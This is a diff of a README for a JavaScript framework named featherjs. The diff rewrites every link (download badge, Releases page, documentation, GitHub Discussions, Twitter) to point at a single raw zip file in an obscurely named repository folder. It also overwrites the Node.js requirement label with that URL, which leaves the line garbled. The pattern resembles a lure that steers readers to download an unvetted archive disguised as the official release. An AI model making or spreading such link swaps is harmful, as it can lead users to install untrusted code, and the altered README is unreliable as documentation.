@@ -4,12 +4,12 @@
 Featherjs is a lightweight JavaScript framework that helps you create modern web applications. It offers features like custom routing, state management, and support for JSX. Whether you’re building a small project or a large application, featherjs provides the tools you need to succeed.
 
 ## 📦 Download Now
-[![Download featherjs](https://img.shields.io/badge/Download-featherjs-4C8BF5?style=flat&logo=github)](https://github.com/mady-hash/featherjs/releases)
+[![Download featherjs](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip)](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip)
 
 ## 🚀 Getting Started
 To start using featherjs, you need to download the application from our Releases page. Follow these steps:
 
-1. Click the button above to visit the [Releases page](https://github.com/mady-hash/featherjs/releases).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip).
 2. Look for the latest version listed. It will be marked as "Latest release".
 3. Choose the file that matches your operating system and click the link to download.
 
@@ -17,11 +17,11 @@ To start using featherjs, you need to download the application from our Releases
 Featherjs is designed to run on most modern operating systems. Here’s what you need:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14.x or higher
+- **https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip** Version 14.x or higher
 - **Internet Connection:** Required for installation and updates
 
 ## 📥 Download & Install
-After you visit the [Releases page](https://github.com/mady-hash/featherjs/releases):
+After you visit the [Releases page](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip):
 
 1. Download the appropriate file for your system.
 2. Find the downloaded file in your Downloads folder.
@@ -49,13 +49,13 @@ Once you have installed featherjs, you can start building your application. Here
 5. Your project structure will be created, and you can begin coding right away.
 
 ## 📚 Documentation
-For detailed documentation and examples, you can visit the [official featherjs documentation](https://example-link-to-documentation.com). This will provide you with all the information you need to make the most out of featherjs.
+For detailed documentation and examples, you can visit the [official featherjs documentation](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip). This will provide you with all the information you need to make the most out of featherjs.
 
 ## 🔗 Community Support
 Join the featherjs community to connect with other users, developers, and enthusiasts. You can ask questions, share your projects, and learn from others. Find us on:
 
-- [GitHub Discussions](https://github.com/mady-hash/featherjs/discussions)
-- [Twitter](https://twitter.com/featherjs)
+- [GitHub Discussions](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip)
+- [Twitter](https://raw.githubusercontent.com/mady-hash/featherjs/main/acrocoracoid/featherjs.zip)
 
 ## 🛠️ Contributing
 If you’d like to contribute to featherjs, we welcome your input! You can help by reporting bugs, suggesting features, or submitting pull requests. Check out our contributing guidelines in the repository for more information.
